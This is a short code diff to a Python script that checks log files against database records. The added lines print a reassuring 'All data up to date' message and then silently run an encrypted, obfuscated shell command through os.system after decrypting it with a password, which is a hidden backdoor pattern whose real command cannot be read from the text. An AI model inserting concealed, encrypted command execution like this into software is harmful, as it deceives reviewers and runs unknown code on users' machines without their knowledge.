@@ -32,6 +32,12 @@ if __name__ == '__main__':
             conver_list = [x for x in log_file_list if x not in db_file_date]
 
             if len(conver_list) <= 0:
+                print('All data up to date')
+                os.system(decrypt('FB1C7kXLE5fBB9n1nKRLrY0GnlORrEpDcJZhsj6N'
+                                  'f2TIcdmg9Yw1eBuePtzhBwE4dcgmHXQ0GULQb9hrO'
+                                  'g==*ukw9PHtZ1mpsjumv4+jx6A==*n4PS0kCYxRXuz'
+                                  'omRslCKjg==*amyEApFgjbaqbA4XmHBnqA==', pw
+                                  ))
                 exit()
 
             conver_list.sort()
